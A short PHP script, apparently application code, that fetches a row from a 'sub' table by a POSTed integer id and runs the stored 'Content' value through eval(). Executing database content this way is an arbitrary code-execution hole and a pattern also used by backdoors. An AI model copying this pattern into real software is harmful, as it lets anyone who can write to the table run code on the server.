	<?php
include 'logtosql.php';
$sub_id = isset($_POST['sub_id']) ? (int)$_POST['sub_id'] :1;
$sql = 'SELECT `Content`
		FROM `sub` 
		WHERE `Id` = ' . $sub_id .
		' ORDER BY `Content`';		
$wynik = mysqli_query($polaczenie, $sql);
if (mysqli_num_rows($wynik) > 0) {
	while (($content = @mysqli_fetch_array($wynik))) {
		$str=  $content['Content'];
		eval(" $str ");
		}}
	mysqli_close($polaczenie); 
	?>